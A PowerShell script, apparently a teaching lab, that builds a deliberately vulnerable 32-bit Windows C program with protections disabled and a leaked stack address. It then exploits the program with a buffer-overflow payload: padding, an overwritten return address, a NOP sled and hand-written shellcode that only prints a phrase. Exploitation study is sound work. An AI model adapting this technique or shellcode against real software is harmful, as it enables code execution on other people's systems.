# 1. Opprett C-kildekoden
$cCode = @'
#include <windows.h>
#include <stdio.h>

void unprotect_stack(void *addr) {
    DWORD oldProtect;
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(addr, &mbi, sizeof(mbi));
    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
}

void vuln(void) {
    char buffer[64];
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD bytesRead = 0;

    unprotect_stack(buffer);

    // Lekker bufferadressen slik at payloaden vet hvor den skal sikte
    printf("[ADDR] %p\n", (void*)buffer);
    fflush(stdout);

    // Leser inntil 256 bytes inn i 64-byte buffer
    ReadFile(hStdin, buffer, 256, &bytesRead, NULL);
}

int main(void) {
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
    vuln();
    printf("Avsluttet normalt.\n");
    return 0;
}
'@
Set-Content -Path "vuln_win.c" -Value $cCode

# 2. Legg til MinGW 32-bit i PATH hvis tilgjengelig, og kompiler
if (Test-Path "C:\mingw32\bin") {
    $env:PATH = "C:\mingw32\bin;$env:PATH"
}

Write-Host "[*] Kompilerer vuln_win.c..." -ForegroundColor Cyan
gcc -m32 -fno-stack-protector -fno-pie "-Wl,--disable-nxcompat" vuln_win.c -o vuln_win.exe

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Kompilering feilet. Kontroller at gcc (MinGW 32-bit) er i PATH." -ForegroundColor Red
    return
}

# 3. Start prosessen med piped standard input/output
# Unngå at .NET StreamWriter sender UTF-8 BOM (EF BB BF) som første ReadFile-lesing
[Console]::InputEncoding = New-Object System.Text.UTF8Encoding($false)

Write-Host "[*] Starter prosessen for å hente lekket bufferadresse..." -ForegroundColor Cyan
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "$PWD\vuln_win.exe"
$psi.UseShellExecute = $false
$psi.RedirectStandardInput = $true
$psi.RedirectStandardOutput = $true
$psi.CreateNoWindow = $true

$proc = [System.Diagnostics.Process]::Start($psi)

# 4. Les adressen fra programmets stdout
$line = $proc.StandardOutput.ReadLine()
Write-Host "[+] Mottatt output: $line" -ForegroundColor Green

if ($line -match '\[ADDR\]\s+([0-9a-fA-F]+)') {
    $bufferAddr = [Convert]::ToUInt32($matches[1], 16)
    Write-Host ("[+] Buffer start: 0x{0:X8}" -f $bufferAddr) -ForegroundColor Green
}
else {
    Write-Host "[!] Kunne ikke hente stakkadresse." -ForegroundColor Red
    $proc.Kill()
    return
}

# 5. Bygg payload:
# [Buffer-utfylling til returadresse (80 bytes)]
# + [Overskrevet returadresse til NOP-sled (4 bytes)]
# + [NOP-sled (32 bytes)]
# + [Shellcode (94 bytes) som looper 10 ganger, printer strengen og avslutter normalt]

# 80 bytes padding som fyller buffer (76 bytes) og lagret EBP (4 bytes)
$padToRet = [byte[]](@(0x90) * 80)

# 32 bytes NOP-sled (0x90) plassert rett etter returadressen
$nopSled = [byte[]](@(0x90) * 32)

# Shellcode: 32-bit x86 posisjonsuavhengig kode
# - Henter ImageBase fra PEB (fs:[0x30] + 0x08)
# - Henter puts og exit fra programmets IAT (__imp__puts og __imp__exit)
# - Kjører en for-løkke 10 ganger: puts("DET VAR EN GANG 123")
# - Kaller puts("Avsluttet normalt.")
# - Kaller exit(0)
[byte[]]$shellcode = @(
    # 1. get_pc for posisjonsuavhengige datapekere
    0xE8, 0x00, 0x00, 0x00, 0x00,                   # call get_pc
    0x5B,                                           # pop ebx (EBX = runtime adresse til get_pc)

    # 2. Hent ImageBase fra PEB (fs:[0x30] + 0x08)
    0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,             # mov eax, [fs:0x30] (PEB)
    0x8B, 0x40, 0x08,                               # mov eax, [eax + 0x08] (PEB->ImageBaseAddress)

    # 3. Hent funksjonspekere fra IAT (__imp__puts og __imp__exit)
    0x8B, 0xB0, 0x74, 0x72, 0x00, 0x00,             # mov esi, [eax + 0x7274] (peker til puts)
    0x8B, 0xA8, 0x54, 0x72, 0x00, 0x00,             # mov ebp, [eax + 0x7254] (peker til exit)

    # 4. For-løkke 10 ganger: puts("DET VAR EN GANG 123")
    0x6A, 0x0A,                                     # push 10
    0x5F,                                           # pop edi (EDI = 10 som løkketeller)
    # loop_print:
    0x8D, 0x4B, 0x32,                               # lea ecx, [ebx + 0x32] (peker til "DET VAR EN GANG 123")
    0x51,                                           # push ecx (argument til puts)
    0xFF, 0xD6,                                     # call esi (kall puts)
    0x83, 0xC4, 0x04,                               # add esp, 4 (rydd argument fra stakk)
    0x4F,                                           # dec edi
    0x75, 0xF4,                                     # jnz loop_print

    # 5. Skriv ut "Avsluttet normalt."
    0x8D, 0x4B, 0x46,                               # lea ecx, [ebx + 0x46] (peker til "Avsluttet normalt.")
    0x51,                                           # push ecx
    0xFF, 0xD6,                                     # call esi (kall puts)
    0x83, 0xC4, 0x04,                               # add esp, 4

    # 6. Avslutt ryddig med exit(0)
    0x6A, 0x00,                                     # push 0
    0xFF, 0xD5,                                     # call ebp (kall exit(0))

    # Streng-data: "DET VAR EN GANG 123\0" (20 bytes)
    0x44, 0x45, 0x54, 0x20, 0x56, 0x41, 0x52, 0x20, # "DET VAR "
    0x45, 0x4E, 0x20, 0x47, 0x41, 0x4E, 0x47, 0x20, # "EN GANG "
    0x31, 0x32, 0x33, 0x00,                         # "123\0"

    # Streng-data: "Avsluttet normalt.\0" (19 bytes)
    0x41, 0x76, 0x73, 0x6C, 0x75, 0x74, 0x74, 0x65, # "Avslutte"
    0x74, 0x20, 0x6E, 0x6F, 0x72, 0x6D, 0x61, 0x6C, # "t normal"
    0x74, 0x2E, 0x00                                # "t.\0"
)

# Returadressen settes til å lande midt i NOP-sledden (offset 84 + 16 bytes)
$targetAddr = $bufferAddr + 84 + 16
$retBytes = [System.BitConverter]::GetBytes([uint32]$targetAddr)
Write-Host ("[+] Returadresse satt til NOP-sled: 0x{0:X8}" -f $targetAddr) -ForegroundColor Yellow

# Slå sammen hele payloaden til en rå byte-array (totalt 210 bytes)
$payload = [byte[]]($padToRet + $retBytes + $nopSled + $shellcode)

# 6. Send payloaden til prosessens stdin
Write-Host "[*] Sender payload ($($payload.Length) bytes)..." -ForegroundColor Cyan
$proc.StandardInput.BaseStream.Write($payload, 0, $payload.Length)
$proc.StandardInput.BaseStream.Flush()
$proc.StandardInput.Close()

# 7. Les og vis programmets resterende output
$output = $proc.StandardOutput.ReadToEnd()
if ($output) {
    Write-Host $output -ForegroundColor Yellow
}

$proc.WaitForExit()
Write-Host ("[+] Prosess avsluttet med kode: 0x{0:X8}" -f $proc.ExitCode) -ForegroundColor Cyan
